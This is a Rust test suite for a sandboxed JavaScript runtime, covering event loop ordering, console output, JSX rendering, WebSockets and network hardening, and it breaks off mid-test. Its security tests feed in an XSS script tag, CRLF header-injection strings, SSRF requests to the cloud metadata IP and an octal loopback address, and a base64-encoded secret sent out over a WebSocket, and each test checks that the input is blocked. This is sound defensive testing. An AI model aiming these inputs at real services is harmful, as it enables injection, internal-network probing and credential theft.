            signal: AbortSignal.abort(new Error("TimersPromiseAborted"))
        });
    } catch (e: any) {
        abortCaught = String(e && e.message || e);
    }

    console.log(JSON.stringify({
        order,
        delayedVal,
        immVal,
        abortCaught
    }));
}
runSuite();
"#;

    let bundled_order = slice_cas::strip_typescript_and_normalize(async_order_ts, true);
    let bc_order = compile_source_to_bytecode(&bundled_order);
    let mut iso_order = SliceIsolate::spawn(
        "wave-a-order-tenant",
        1,
        CapabilityToken::pure_compute(),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_order.set_deterministic_seed(Some(20261105));
    let m_order = iso_order.execute_bytecode(&bc_order, None).unwrap();
    let out_order: serde_json::Value = serde_json::from_str(&m_order.stdout[0]).unwrap();
    assert_eq!(
        out_order["order"],
        serde_json::json!([
            "sync",
            "nextTick:hi:1",
            "promise-then",
            "queue-microtask",
            "nested-nextTick",
            "immediate:check",
            "timeout-0"
        ])
    );
    assert_eq!(out_order["delayedVal"], "warped-250ms");
    assert_eq!(out_order["immVal"], "imm-resolved");
    assert!(out_order["abortCaught"]
        .as_str()
        .unwrap_or("")
        .contains("TimersPromiseAborted"));

    // 2. Verify full WHATWG `console.*` (`table`, `time`, `timeLog`, `timeEnd`, `group`, `groupEnd`, `count`, `countReset`, `dir`, `assert`)
    //    and verify that Outbound Egress Secret DLP traps a secret leaked inside `console.table()`!
    let console_ts = r#"
console.group("OuterGroup");
console.log("inside-outer");
console.groupCollapsed("InnerGroup");
console.count("hits");
console.count("hits");
console.countReset("hits");
console.count("hits");
console.groupEnd();
console.groupEnd();

console.time("db-query");
console.timeLog("db-query", "rows=2");
console.timeEnd("db-query");

console.assert(true, "should-not-print");
console.assert(false, "bad-invariant", 404);
console.dir({ service: "slice", nested: { level: 2, deep: { hidden: true } } }, { depth: 1 });
console.table([
    { route: "/health", status: 200 },
    { route: "/users", status: 201 }
]);
"#;
    let bc_console = compile_source_to_bytecode(console_ts);
    let mut iso_console = SliceIsolate::spawn(
        "wave-a-console-tenant",
        2,
        CapabilityToken::pure_compute(),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_console.set_deterministic_seed(Some(20261105));
    let m_console = iso_console.execute_bytecode(&bc_console, None).unwrap();
    let joined_console = m_console.stdout.join("\n");
    assert!(joined_console.contains(
        "OuterGroup\n  inside-outer\n  InnerGroup\n    hits: 1\n    hits: 2\n    hits: 1"
    ));
    assert!(joined_console.contains("db-query: 1.000ms rows=2"));
    assert!(joined_console.contains("db-query: 2.000ms"));
    assert!(joined_console.contains("Assertion failed: bad-invariant 404"));
    assert!(joined_console.contains("{ service: 'slice', nested: [Object] }"));
    assert!(joined_console.contains("| (index) | route     | status |"));
    assert!(joined_console.contains("| 0       | '/health' | 200    |"));

    // Verify Egress DLP firewall traps secret leaked via `console.table`
    let dlp_table_js = r#"
console.table([{ user: "alice", token: "sk_live_SUPER_SECRET_KEY_999" }]);
"#;
    let bc_dlp = compile_source_to_bytecode(dlp_table_js);
    let mut iso_dlp = SliceIsolate::spawn(
        "wave-a-dlp-console",
        3,
        CapabilityToken::pure_compute(),
        2_000_000,
        4 * 1024 * 1024,
    );
    iso_dlp.add_egress_audit_secret("sk_live_SUPER_SECRET_KEY_999");
    let dlp_err = iso_dlp.execute_bytecode(&bc_dlp, None).unwrap_err();
    assert!(
        dlp_err.to_string().contains("EGRESS_SECRET_LEAK_BLOCKED"),
        "Expected EGRESS_SECRET_LEAK_BLOCKED on console.table secret leak, got: {}",
        dlp_err
    );

    // 3. Verify Native Oxc `.tsx` JSX/TSX Compilation + Built-In `slice:jsx` SSR Runtime & XSS Escaping
    let tsx_source = r###"
import { renderToString, raw } from "slice:jsx";

interface BadgeProps {
    label: string;
    active?: boolean;
}

function Badge(props: BadgeProps) {
    return <span className={props.active ? "badge-on" : "badge-off"} data-ok={props.active}>{props.label}</span>;
}

function Page(props: { user: string; items: string[] }) {
    return (
        <>
            <header style={{ backgroundColor: "#111", fontSize: "14px" }}>
                <h1>Hello {props.user}</h1>
                <Badge label="PRO" active={true} />
                <br />
            </header>
            <ul>
                {props.items.map((item, idx) => <li key={idx}>{item}</li>)}
            </ul>
            {raw("<!-- trusted-footer -->")}
        </>
    );
}

const html = renderToString(
    <Page user={'<script>alert("xss")</script>'} items={["one", "two & three"]} />
);
console.log(html);
"###;
    let compiled_tsx = slice_cas::strip_typescript_and_normalize(tsx_source, true);
    let tsx_metrics = run_source_isolated(
        "wave-a-tsx-tenant",
        &compiled_tsx,
        CapabilityToken::pure_compute(),
        5_000_000,
        8 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        tsx_metrics.stdout[0],
        r#"<header style="background-color:#111;font-size:14px"><h1>Hello &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</h1><span class="badge-on" data-ok>PRO</span><br/></header><ul><li>one</li><li>two &amp; three</li></ul><!-- trusted-footer -->"#
    );
}

#[test]
fn test_wave_b_network_security_hardening_and_rfc6455_websocket_engine() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // 1. Verify RFC 6455 Section 1.3 official Sec-WebSocket-Accept test vector
    assert_eq!(
        crate::compute_websocket_accept_key("dGhlIHNhbXBsZSBub25jZQ=="),
        "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="
    );

    // 2. Verify RFC 6455 frame encode/decode across 7-bit, 16-bit, and 64-bit lengths + 4-byte XOR masking
    for len in [0usize, 11, 125, 126, 1024, 65536] {
        let payload: Vec<u8> = (0..len).map(|i| (i * 37) as u8).collect();
        let mask = [0x37, 0xfa, 0x21, 0x3d];
        let encoded =
            crate::encode_websocket_frame(true, crate::WS_OPCODE_BINARY, Some(mask), &payload);
        let decoded = crate::decode_websocket_frame(&encoded, crate::MAX_WS_FRAME_BYTES)
            .unwrap()
            .unwrap();
        assert!(decoded.fin);
        assert_eq!(decoded.opcode, crate::WS_OPCODE_BINARY);
        assert!(decoded.masked);
        assert_eq!(decoded.payload, payload);
        assert_eq!(decoded.bytes_consumed, encoded.len());
    }

    // Reject non-zero RSV bits and oversized frames before allocation
    let bad_rsv = [0x91u8, 0x00];
    assert!(crate::decode_websocket_frame(&bad_rsv, 1024).is_err());
    let oversized_hdr =
        crate::encode_websocket_frame(true, crate::WS_OPCODE_TEXT, None, &[b'a'; 200]);
    assert!(crate::decode_websocket_frame(&oversized_hdr, 64)
        .unwrap_err()
        .contains("MemoryCeilingExceeded"));

    // 3. Verify N-Sec-2 (CRLF / tchar header validators) and N-Sec-5 (checked chunked body parser)
    assert!(crate::is_valid_http_header_name("X-Custom-Token"));
    assert!(!crate::is_valid_http_header_name("X-Bad\r\nHeader"));
    assert!(!crate::is_valid_http_header_name("X Bad"));
    assert!(crate::is_valid_http_header_value("Bearer abc.123"));
    assert!(!crate::is_valid_http_header_value("val\r\nX-Injected: 1"));
    assert!(!crate::is_valid_request_target("/api/v1/test HTTP/1.1\r\n"));

    let valid_chunked = b"5;ext=1\r\nhello\r\n6\r\n-world\r\n0\r\n\r\n";
    let (decoded_chunks, consumed) = crate::parse_chunked_body(valid_chunked, 1024)
        .unwrap()
        .unwrap();
    assert_eq!(decoded_chunks, b"hello-world");
    assert_eq!(consumed, valid_chunked.len());

    let bad_hex_chunk = b"ZZZZ\r\nhello\r\n0\r\n\r\n";
    assert!(crate::parse_chunked_body(bad_hex_chunk, 1024).is_err());
    let missing_crlf_chunk = b"5\r\nhelloXX0\r\n\r\n";
    assert!(crate::parse_chunked_body(missing_crlf_chunk, 1024).is_err());

    // 4. Verify N-Sec-1: Outbound HTTP response exceeding tenant memory budget traps with MemoryCeilingExceeded
    let bomb_listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let bomb_port = bomb_listener.local_addr().unwrap().port();
    let bomb_thread = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = bomb_listener.accept() {
            let mut req_buf = [0u8; 1024];
            let _ = stream.read(&mut req_buf);
            let resp = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 1048576\r\nConnection: close\r\n\r\n";
            let _ = stream.write_all(resp.as_bytes());
        }
    });
    let bomb_caps =
        CapabilityToken::pure_compute().with_net_host(format!("127.0.0.1:{}", bomb_port));
    let bomb_js = format!(
        r#"async function main() {{ await fetch("http://127.0.0.1:{}/bomb"); }} main();"#,
        bomb_port
    );
    let bomb_err = run_source_isolated(
        "nsec1-bomb-tenant",
        &bomb_js,
        bomb_caps,
        1_000_000,
        64 * 1024, // 64 KB tenant memory limit vs 1 MB Content-Length
    )
    .unwrap_err();
    assert!(
        bomb_err.to_string().contains("exceeded memory ceiling"),
        "Expected MemoryCeilingExceeded on 1MB response into 64KB tenant, got: {}",
        bomb_err
    );
    let _ = bomb_thread.join();

    // 5. Verify Live RFC 6455 Client WebSocket (`ws://`) + Ping/Pong + Binary Uint8Array + Close
    let ws_listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let ws_port = ws_listener.local_addr().unwrap().port();
    let ws_server = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = ws_listener.accept() {
            let mut req_buf = [0u8; 2048];
            let n = stream.read(&mut req_buf).unwrap();
            let req_str = String::from_utf8_lossy(&req_buf[..n]);
            let key = req_str
                .lines()
                .find_map(|l| {
                    let (k, v) = l.split_once(':')?;
                    if k.trim().eq_ignore_ascii_case("sec-websocket-key") {
                        Some(v.trim().to_string())
                    } else {
                        None
                    }
                })
                .expect("Missing Sec-WebSocket-Key from client");
            let accept = crate::compute_websocket_accept_key(&key);
            let handshake = format!(
                "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: {}\r\nSec-WebSocket-Protocol: chat.v1\r\n\r\n",
                accept
            );
            stream.write_all(handshake.as_bytes()).unwrap();
            stream.flush().unwrap();

            let mut pending = Vec::new();
            // 1) Read text frame from client, send a PING first, verify client PONG, then send text reply
            let (op1, msg1) =
                crate::read_websocket_message_from_stream(&mut stream, &mut pending, true, 65536)
                    .unwrap()
                    .unwrap();
            assert_eq!(op1, crate::WS_OPCODE_TEXT);
            assert_eq!(msg1, b"hello-slice-ws");

            let ping_frame =
                crate::encode_websocket_frame(true, crate::WS_OPCODE_PING, None, b"hb-1");
            stream.write_all(&ping_frame).unwrap();
            let reply_text = crate::encode_websocket_frame(
                true,
                crate::WS_OPCODE_TEXT,
                None,
                b"ack:hello-slice-ws",
            );
            stream.write_all(&reply_text).unwrap();
            stream.flush().unwrap();

            // 2) Read binary frame from client (`read_websocket_message_from_stream` consumes client's PONG automatically)
            let (op2, msg2) =
                crate::read_websocket_message_from_stream(&mut stream, &mut pending, true, 65536)
                    .unwrap()
                    .unwrap();
            assert_eq!(op2, crate::WS_OPCODE_BINARY);
            assert_eq!(msg2, vec![10, 20, 30, 40]);

            let reply_bin = crate::encode_websocket_frame(
                true,
                crate::WS_OPCODE_BINARY,
                None,
                &[40, 30, 20, 10],
            );
            stream.write_all(&reply_bin).unwrap();
            stream.flush().unwrap();

            // 3) Read CLOSE frame from client and echo CLOSE
            let (op3, close_payload) =
                crate::read_websocket_message_from_stream(&mut stream, &mut pending, true, 65536)
                    .unwrap()
                    .unwrap();
            assert_eq!(op3, crate::WS_OPCODE_CLOSE);
            let close_reply =
                crate::encode_websocket_frame(true, crate::WS_OPCODE_CLOSE, None, &close_payload);
            let _ = stream.write_all(&close_reply);
            let _ = stream.flush();
        }
    });

    let ws_client_js = format!(
        r#"
const events = [];
const ws = new WebSocket("ws://127.0.0.1:{ws_port}/realtime", ["chat.v1"]);
ws.binaryType = "arraybuffer";

ws.onopen = () => {{
    events.push("open:" + ws.protocol);
    ws.send("hello-slice-ws");
    ws.send(new Uint8Array([10, 20, 30, 40]));
    ws.close(1000, "normal-done");
}};

ws.onmessage = (ev) => {{
    if (typeof ev.data === "string") {{
        events.push("text:" + ev.data);
    }} else if (ev.data instanceof ArrayBuffer) {{
        const u8 = new Uint8Array(ev.data);
        events.push("bin:" + Array.from(u8).join(","));
    }}
}};

ws.onclose = (ev) => {{
    events.push("close:" + ev.code + ":" + ev.reason);
    console.log(JSON.stringify(events));
}};
"#,
        ws_port = ws_port
    );
    let ws_caps = CapabilityToken::pure_compute().with_net_host(format!("127.0.0.1:{}", ws_port));
    let ws_metrics = run_source_isolated(
        "wave-b-ws-client",
        &ws_client_js,
        ws_caps.clone(),
        2_000_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    let _ = ws_server.join();

    let ws_events: Vec<String> = serde_json::from_str(&ws_metrics.stdout[0]).unwrap();
    assert_eq!(
        ws_events,
        vec![
            "open:chat.v1",
            "text:ack:hello-slice-ws",
            "bin:40,30,20,10",
            "close:1000:normal-done"
        ]
    );

    // 6. Verify WebSocket Outbound Egress Secret DLP traps when sending raw or Base64-encoded secrets over `ws.send()`
    let dlp_ws_js = r#"
Slice.mockWebSocket("ws://stream.partner.example.com/ingest", "echo");
const ws = new WebSocket("ws://stream.partner.example.com/ingest");
ws.send(btoa("sk_live_WS_SECRET_TOKEN_777"));
"#;
    let bc_ws_dlp = compile_source_to_bytecode(dlp_ws_js);
    let mut iso_ws_dlp = SliceIsolate::spawn(
        "wave-b-ws-dlp",
        10,
        CapabilityToken::pure_compute().with_net_host("stream.partner.example.com:80"),
        1_000_000,
        4 * 1024 * 1024,
    );
    iso_ws_dlp.add_egress_audit_secret("sk_live_WS_SECRET_TOKEN_777");
    let ws_dlp_err = iso_ws_dlp.execute_bytecode(&bc_ws_dlp, None).unwrap_err();
    assert!(
        ws_dlp_err
            .to_string()
            .contains("EGRESS_SECRET_LEAK_BLOCKED"),
        "Expected EGRESS_SECRET_LEAK_BLOCKED on WebSocket secret frame exfiltration, got: {}",
        ws_dlp_err
    );
}

#[test]
fn test_wave_b_nsec7_cross_tenant_outbound_connection_pool_isolation_and_nsec2_header_guards() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::{
        atomic::{AtomicUsize, Ordering},
        Arc,
    };

    // 1. N-Sec-7: Verify that two tenants hitting the exact same upstream origin NEVER share
    // an idle Keep-Alive socket, while same-tenant sequential requests DO reuse their own socket.
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let accept_count = Arc::new(AtomicUsize::new(0));
    let accept_clone = Arc::clone(&accept_count);

    let srv = std::thread::spawn(move || {
        // Expect 2 distinct TCP connections (1 for tenant-alpha, 1 for tenant-beta),
        // each serving 2 Keep-Alive requests.
        for conn_idx in 1..=2 {
            if let Ok((mut stream, _)) = listener.accept() {
                accept_clone.fetch_add(1, Ordering::SeqCst);
                let mut buf = [0u8; 2048];
                for req_idx in 1..=2 {
                    let n = stream.read(&mut buf).unwrap_or(0);
                    if n == 0 {
                        break;
                    }
                    let body = format!("{{\"conn\":{},\"req\":{}}}", conn_idx, req_idx);
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: keep-alive\r\n\r\n{}",
                        body.len(),
                        body
                    );
                    let _ = stream.write_all(resp.as_bytes());
                    let _ = stream.flush();
                }
            }
        }
    });

    let js = format!(
        r#"
async function main() {{
    const r1 = await (await fetch("http://127.0.0.1:{port}/ping?step=1")).json();
    const r2 = await (await fetch("http://127.0.0.1:{port}/ping?step=2")).json();
    console.log(JSON.stringify([r1, r2]));
}}
main();
"#,
        port = port
    );
    let caps = CapabilityToken::pure_compute().with_net_host(format!("127.0.0.1:{}", port));

    let m_alpha = run_source_isolated(
        "tenant-alpha",
        &js,
        caps.clone(),
        2_000_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m_alpha.stdout[0],
        r#"[{"conn":1,"req":1},{"conn":1,"req":2}]"#
    );
    assert_eq!(accept_count.load(Ordering::SeqCst), 1);

    let m_beta = run_source_isolated("tenant-beta", &js, caps, 2_000_000, 4 * 1024 * 1024).unwrap();
    assert_eq!(
        m_beta.stdout[0],
        r#"[{"conn":2,"req":1},{"conn":2,"req":2}]"#
    );
    assert_eq!(accept_count.load(Ordering::SeqCst), 2);
    let _ = srv.join();

    // 2. N-Sec-2: Verify outbound `fetch()` rejects CRLF header injection on live outbound sockets
    let bad_hdr_js = format!(
        r#"
async function main() {{
    try {{
        await fetch("http://127.0.0.1:{port}/test", {{
            headers: {{ "x-safe": "ok\r\nX-Injected: pwned" }}
        }});
        console.log("UNEXPECTED_SUCCESS");
    }} catch (e) {{
        console.log("BLOCKED:" + String(e));
    }}
}}
main();
"#,
        port = port
    );
    let m_hdr = run_source_isolated(
        "tenant-nsec2",
        &bad_hdr_js,
        CapabilityToken::pure_compute().with_net_host(format!("127.0.0.1:{}", port)),
        1_000_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    assert!(
        m_hdr.stdout[0].starts_with("BLOCKED:"),
        "Expected outbound header injection to be blocked, got: {}",
        m_hdr.stdout[0]
    );

    // 3. N-Sec-8 + WebSocket Pre-Connect SSRF Firewall:
    //    - Cloud metadata IP (`ws://169.254.169.254/latest`) -> SSRF_METADATA_BLOCKED
    //    - Non-canonical octal loopback (`ws://0177.0.0.1:8080/ws`) under wildcard `allow_net = ["*"]` -> blocked
    let ws_ssrf_meta_js = r#"const ws = new WebSocket("ws://169.254.169.254/latest/meta-data");"#;
    let err_meta = run_source_isolated(
        "tenant-ws-ssrf-meta",
        ws_ssrf_meta_js,
        CapabilityToken::pure_compute().with_net_host("*"),
        1_000_000,
        4 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_meta.to_string().contains("SSRF_METADATA_BLOCKED"),
        "Expected SSRF_METADATA_BLOCKED for WebSocket metadata target, got: {}",
        err_meta
    );

    let ws_ssrf_octal_js = r#"const ws = new WebSocket("ws://0177.0.0.1:8080/internal");"#;
    let err_octal = run_source_isolated(
        "tenant-ws-ssrf-octal",
        ws_ssrf_octal_js,
        CapabilityToken::pure_compute().with_net_host("*"),
        1_000_000,
        4 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_octal
            .to_string()
            .contains("lacks outbound network authority for host '0177.0.0.1:8080'"),
        "Expected NetAccessDenied for octal loopback WebSocket under wildcard allow_net, got: {}",
        err_octal
    );
}

#[test]
fn test_wave_b_rfc6455_fragmented_continuation_interleaved_ping_and_frame_limits() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // 1. Verify extended 16-bit (126) and 64-bit (127) payload lengths + 4-byte u32 XOR masking
    let mask = [0x12, 0x34, 0x56, 0x78];
    let payload_16bit = vec![0xABu8; 2048];
    let encoded_16 =
        crate::encode_websocket_frame(true, crate::WS_OPCODE_BINARY, Some(mask), &payload_16bit);
    let decoded_16 = crate::decode_websocket_frame(&encoded_16, 8192)
        .unwrap()
        .unwrap();
    assert_eq!(decoded_16.opcode, crate::WS_OPCODE_BINARY);
    assert_eq!(decoded_16.payload.len(), 2048);
    assert!(decoded_16.payload.iter().all(|&b| b == 0xAB));

    let payload_64bit = vec![0x5Cu8; 70_000];
    let encoded_64 =
        crate::encode_websocket_frame(true, crate::WS_OPCODE_BINARY, Some(mask), &payload_64bit);
    let decoded_64 = crate::decode_websocket_frame(&encoded_64, 100_000)
        .unwrap()
        .unwrap();
    assert_eq!(decoded_64.opcode, crate::WS_OPCODE_BINARY);
    assert_eq!(decoded_64.payload.len(), 70_000);
    assert!(decoded_64.payload.iter().all(|&b| b == 0x5C));

    // 2. Verify RFC 6455 protocol violation checks:
    //    - Non-zero RSV bits (`0x40` RSV1 set) -> Err
    let bad_rsv = [0x81 | 0x40, 0x01, b'a'];
    assert!(crate::decode_websocket_frame(&bad_rsv, 1024)
        .unwrap_err()
        .contains("non-zero RSV bits"));
    //    - Fragmented control frame (`FIN=0` with opcode `0x9` PING) -> Err
    let frag_ping = [0x09, 0x02, b'h', b'i'];
    assert!(crate::decode_websocket_frame(&frag_ping, 1024)
        .unwrap_err()
        .contains("fragmented control frame"));
    //    - Control frame > 125 bytes -> Err
    let mut huge_ping = vec![0x89, 126, 0x00, 126];
    huge_ping.extend_from_slice(&[b'x'; 126]);
    assert!(crate::decode_websocket_frame(&huge_ping, 1024)
        .unwrap_err()
        .contains("exceeds 125 bytes"));

    // 3. Verify live Client WebSocket reassembling multi-frame fragmented messages (`FIN=0` + interleaved `PING` + `0x0` continuation + `FIN=1`)
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let srv = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut req_buf = [0u8; 2048];
            let n = stream.read(&mut req_buf).unwrap();
            let req_str = String::from_utf8_lossy(&req_buf[..n]);
            let key = req_str
                .lines()
                .find_map(|l| {
                    let (k, v) = l.split_once(':')?;
                    if k.trim().eq_ignore_ascii_case("sec-websocket-key") {
                        Some(v.trim().to_string())
                    } else {
                        None
                    }
                })
                .unwrap();
            let accept = crate::compute_websocket_accept_key(&key);
            let handshake = format!(
                "HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: {}\r\n\r\n",
                accept
            );
            stream.write_all(handshake.as_bytes()).unwrap();
            stream.flush().unwrap();

            let mut pending = Vec::new();
            // Read client trigger message
            let (op, msg) =
                crate::read_websocket_message_from_stream(&mut stream, &mut pending, true, 65536)
                    .unwrap()
                    .unwrap();
            assert_eq!(op, crate::WS_OPCODE_TEXT);
            assert_eq!(msg, b"send-fragmented");

            // Send 3 fragments of a single text message with an interleaved PING in the middle!
            let frag1 =
                crate::encode_websocket_frame(false, crate::WS_OPCODE_TEXT, None, b"part1-");
            let ping =
                crate::encode_websocket_frame(true, crate::WS_OPCODE_PING, None, b"mid-frag-ping");
            let frag2 = crate::encode_websocket_frame(
                false,
                crate::WS_OPCODE_CONTINUATION,
                None,
                b"part2-",
            );
            let frag3 =
                crate::encode_websocket_frame(true, crate::WS_OPCODE_CONTINUATION, None, b"part3!");
            let mut combined = Vec::new();
            combined.extend_from_slice(&frag1);
            combined.extend_from_slice(&ping);
            combined.extend_from_slice(&frag2);
            combined.extend_from_slice(&frag3);
            stream.write_all(&combined).unwrap();
            stream.flush().unwrap();

            // Read client close (which also drains the auto-PONG sent by the client during fragmentation)
            let (op_close, close_payload) =
                crate::read_websocket_message_from_stream(&mut stream, &mut pending, true, 65536)
                    .unwrap()
                    .unwrap();
            assert_eq!(op_close, crate::WS_OPCODE_CLOSE);
            let close_reply =
                crate::encode_websocket_frame(true, crate::WS_OPCODE_CLOSE, None, &close_payload);
            let _ = stream.write_all(&close_reply);
            let _ = stream.flush();
        }
    });

    let client_js = format!(
        r#"
const received = [];
const ws = new WebSocket("ws://127.0.0.1:{port}/frag");
ws.onopen = () => {{
    ws.send("send-fragmented");
    ws.close(1000, "ok");
}};
ws.onmessage = (ev) => {{
    received.push(ev.data);
}};
ws.onclose = (ev) => {{
    received.push("close:" + ev.code);
    console.log(JSON.stringify(received));
}};
"#,
        port = port
    );
    let m = run_source_isolated(
        "tenant-ws-frag",
        &client_js,
        CapabilityToken::pure_compute().with_net_host(format!("127.0.0.1:{}", port)),
        2_000_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    let _ = srv.join();
    assert_eq!(m.stdout[0], r#"["part1-part2-part3!","close:1000"]"#);
}

#[test]
fn test_compile_time_prelude_minifier_and_lazy_sharded_globals() {
    use crate::js_minifier::minify_js_source;
    use crate::js_preludes::{
        BLOB_FORMDATA_PRELUDE, BLOB_FORMDATA_PRELUDE_SRC, BUFFER_BINARY_RW_PRELUDE,
        BUFFER_BINARY_RW_PRELUDE_SRC, CONSOLE_EXT_PRELUDE, CONSOLE_EXT_PRELUDE_SRC,
        DOM_EVENTS_PRELUDE, DOM_EVENTS_PRELUDE_SRC, ENCODING_EVENTS_PRELUDE,
        ENCODING_EVENTS_PRELUDE_SRC, FETCH_HEADERS_REQ_RES_PRELUDE,
        FETCH_HEADERS_REQ_RES_PRELUDE_SRC, FULL_BUFFER_PRELUDE, FULL_BUFFER_PRELUDE_SRC,
        OUTBOUND_FETCH_SSE_PRELUDE, OUTBOUND_FETCH_SSE_PRELUDE_SRC, STREAMS_FORMDATA_PRELUDE,
        STREAMS_FORMDATA_PRELUDE_SRC, STRUCTURED_CLONE_PRELUDE, STRUCTURED_CLONE_PRELUDE_SRC,
        TRANSFORM_COMPRESSION_STREAMS_PRELUDE, TRANSFORM_COMPRESSION_STREAMS_PRELUDE_SRC,
        ULTRA_CORE_PRELUDE, ULTRA_CORE_PRELUDE_SRC, URL_PATTERN_PRELUDE, URL_PATTERN_PRELUDE_SRC,
        WASM_PRELUDE, WASM_PRELUDE_SRC, WEBCRYPTO_CLONE_PRELUDE, WEBCRYPTO_CLONE_PRELUDE_SRC,
        WEBSOCKET_PRELUDE, WEBSOCKET_PRELUDE_SRC, WEB_FETCH_URL_PRELUDE, WEB_FETCH_URL_PRELUDE_SRC,
        WORKERS_SOCKETS_PRELUDE, WORKERS_SOCKETS_PRELUDE_SRC,
    };

    // 1. Verify all 9 readable `.js` prelude sources are preserved and compile-time minified
    let pairs: &[(&str, &str, &[u8])] = &[
        (
            "00_ultra_core.js",
            ULTRA_CORE_PRELUDE_SRC,
            ULTRA_CORE_PRELUDE,
        ),
        (
            "01_web_fetch_url.js",
            WEB_FETCH_URL_PRELUDE_SRC,
            WEB_FETCH_URL_PRELUDE,
        ),
        (
            "02_encoding_events.js",
            ENCODING_EVENTS_PRELUDE_SRC,
            ENCODING_EVENTS_PRELUDE,
        ),
        (
            "03_streams_formdata.js",
            STREAMS_FORMDATA_PRELUDE_SRC,
            STREAMS_FORMDATA_PRELUDE,
        ),
        (
            "04_webcrypto_clone.js",
            WEBCRYPTO_CLONE_PRELUDE_SRC,
            WEBCRYPTO_CLONE_PRELUDE,
        ),
        (
            "05_full_buffer.js",
            FULL_BUFFER_PRELUDE_SRC,
            FULL_BUFFER_PRELUDE,
        ),
        (
            "06_console_ext.js",
            CONSOLE_EXT_PRELUDE_SRC,
            CONSOLE_EXT_PRELUDE,
        ),
        ("07_websocket.js", WEBSOCKET_PRELUDE_SRC, WEBSOCKET_PRELUDE),
        (
            "08_workers_sockets.js",
            WORKERS_SOCKETS_PRELUDE_SRC,
            WORKERS_SOCKETS_PRELUDE,
        ),
        ("09_wasm.js", WASM_PRELUDE_SRC, WASM_PRELUDE),
        (
            "10_outbound_fetch_sse.js",
            OUTBOUND_FETCH_SSE_PRELUDE_SRC,
            OUTBOUND_FETCH_SSE_PRELUDE,
        ),
        (
            "11_fetch_headers_req_res.js",
            FETCH_HEADERS_REQ_RES_PRELUDE_SRC,
            FETCH_HEADERS_REQ_RES_PRELUDE,
        ),
        (
            "12_url_pattern.js",
            URL_PATTERN_PRELUDE_SRC,
            URL_PATTERN_PRELUDE,
        ),
        (
            "13_dom_events.js",
            DOM_EVENTS_PRELUDE_SRC,
            DOM_EVENTS_PRELUDE,
        ),
        (
            "14_transform_compression_streams.js",
            TRANSFORM_COMPRESSION_STREAMS_PRELUDE_SRC,
            TRANSFORM_COMPRESSION_STREAMS_PRELUDE,
        ),
        (
            "15_blob_formdata.js",
            BLOB_FORMDATA_PRELUDE_SRC,
            BLOB_FORMDATA_PRELUDE,
        ),
        (
            "16_structured_clone.js",
            STRUCTURED_CLONE_PRELUDE_SRC,
            STRUCTURED_CLONE_PRELUDE,
        ),
        (
            "17_buffer_binary_rw.js",
            BUFFER_BINARY_RW_PRELUDE_SRC,
            BUFFER_BINARY_RW_PRELUDE,
        ),
    ];

    let mut total_src_bytes = 0usize;
    let mut total_min_bytes = 0usize;
    for &(name, src, minified) in pairs {
        assert!(
            src.lines().count() > 25,
            "{} should be human-readable multi-line source",
            name
        );
        assert!(
            minified.len() < src.len(),
            "{} compile-time minified bytes ({}) should be smaller than source ({})",
            name,
            minified.len(),
            src.len()
        );
        // Verify deterministic reproducibility between runtime `minify_js_source` and `build.rs` output
        let runtime_min = minify_js_source(src);
        assert_eq!(
            runtime_min.as_bytes(),
            minified,
            "{} build.rs output must match minify_js_source deterministically",
            name
        );
        total_src_bytes += src.len();
        total_min_bytes += minified.len();
    }
    assert!(
        total_min_bytes * 100 < total_src_bytes * 75,
        "Expected >= 25% compile-time size reduction across preludes (src={}, min={})",
        total_src_bytes,
        total_min_bytes
    );

    // 2. Verify dynamic `globalThis["Web" + "Socket"]` self-replacing lazy getter behavior:
    //    Because the string `"WebSocket"` does not appear literally in `dynamic_js`, `detect_needed_shards`
    //    returns 0, testing pure on-demand `__defLazy` getter self-replacement on `globalThis`.
    let dynamic_js = r#"
const key = "Web" + "Socket";
const descBefore = Object.getOwnPropertyDescriptor(globalThis, key);
const wasLazyGetter = Boolean(descBefore && typeof descBefore.get === "function" && descBefore.enumerable === false);
const ctor = globalThis[key];
const descAfter = Object.getOwnPropertyDescriptor(globalThis, key);
const replacedWithValue = Boolean(descAfter && typeof descAfter.value === "function" && descAfter.get === undefined);
console.log(JSON.stringify({
    wasLazyGetter,
    isFunc: typeof ctor === "function",
    openConst: ctor.OPEN,
    replacedWithValue
}));
"#;
    let m = run_source_isolated(
        "lazy-shard-tenant",
        dynamic_js,
        CapabilityToken::pure_compute(),
        500_000,
        4 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(
        m.stdout[0],
        r#"{"wasLazyGetter":true,"isFunc":true,"openConst":1,"replacedWithValue":true}"#
    );
}

#[test]
fn test_web_worker_and_node_worker_threads_roundtrip() {
    let code = r#"
import {
    Worker as NodeWorker,
    isMainThread,
    MessageChannel,
    receiveMessageOnPort,
} from "node:worker_threads";

async function main() {
    // 1. Verify URL.canParse + URL.createObjectURL + WHATWG Web Worker round-trip
    const canParseOk = URL.canParse("https://example.com/a") && !URL.canParse("://bad");
    const blob = new Blob([
